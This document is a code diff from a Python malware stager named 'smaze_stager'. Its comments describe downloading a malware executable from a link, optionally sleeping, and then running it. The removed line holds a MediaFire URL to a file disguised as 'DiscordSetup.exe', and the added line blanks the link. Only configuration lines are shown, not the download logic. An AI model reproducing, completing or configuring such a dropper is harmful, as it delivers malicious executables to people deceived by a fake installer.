@@ -9,7 +9,7 @@ import urllib3
 import shutil
 import sys
 
-link = "https://download2390.mediafire.com/7xf1mg70ma5g/54mms69f9v9gvcl/DiscordSetup.exe"            # input the link to the malware download page here (make sure that the url ends in something like ".exe")
+link = ""            # input the link to the malware download page here (make sure that the url ends in something like ".exe")
 sleep_before = 0     # input the amount of time smaze_stager will sleep until it downloads the malware (in seconds) ;  leave default of '0' for nothing
 sleep_after = 0       # input the amount of time smaze_stager will sleep after it downloads the malware,until it executes it (in seconds) ; leave default of '0' for nothing
 urllib3.disable_warnings()
